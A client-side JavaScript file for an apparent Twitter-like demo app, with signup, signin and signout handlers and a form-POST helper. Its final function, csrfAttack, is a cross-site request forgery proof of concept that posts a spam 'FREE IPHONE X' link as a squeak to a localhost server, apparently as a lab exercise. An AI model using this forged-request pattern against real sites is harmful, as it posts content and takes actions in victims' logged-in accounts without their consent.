function signup(button) {

    button.blur();

    let username = $('#signupusername').val();
    let password = $('#signuppassword').val();
    let credentials = {username: username, password: password};

    $.post(
        {
        url: 'signup',
        data: JSON.stringify(credentials),
        contentType: 'application/json',
        success: res => {

            if (!res.success) {

                switch (res.reason) {
                    case 'username' :
                    $('#signupusername').addClass('is-invalid');
                    $('#signuppassword').removeClass('is-invalid');
                    break;

                    case 'password' :
                    $('#signupusername').removeClass('is-invalid');
                    $('#signuppassword').addClass('is-invalid');
                    break;
                }

            } else {
                location.reload();
            }

        }
        }
    );
}

function signin(button) {
  
    button.blur();

    let username = $('#username').val();
    let password = $('#password').val();
    let credentials = {username: username, password: password};

    console.log('SIGNIN PUSHED')

    $.post(
        {
            url: 'signin',
            data: JSON.stringify(credentials),
            contentType: 'application/json',
            success: res => {
                if (res) {
                    location.reload();
                    //updateMainContainer()
                } else {
                    $('#username').addClass('is-invalid');
                    $('#password').addClass('is-invalid');
                }
            }
        }
    );
}

function signout(button) {

    button.blur();

    $.post('signout', res => {
            console.log(res);
            if (res) {
                location.reload();
            }
        }
    );
}

function httpPost (theUrl, content) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", theUrl, false);
    xmlHttp.setRequestHeader('content-type', 'application/x-www-form-urlencoded')

    var formBody = [];
    for (var property in content) {
      var encodedKey = encodeURIComponent(property);
      var encodedValue = encodeURIComponent(content[property]);
      formBody.push(encodedKey + "=" + encodedValue);
    }
    formBody = formBody.join("&");
    console.log(formBody)

    xmlHttp.send(formBody);
    return xmlHttp.responseText;
}

function csrfAttack(button) {

    button.blur();

    httpPost('https://localhost:8000/squeak', { squeak: "GET A <a href=\"https://localhost:8000\">FREE IPHONE X HERE!</a>" })//"squeak=GET A <a href=\"https://localhost:8000\">FREE IPHONE X HERE!</a>")
    /*$.post('https://localhost:8000/squeak', res => {
            console.log(res);
            if (res) {
                location.reload();
            }
        }
    );*/
}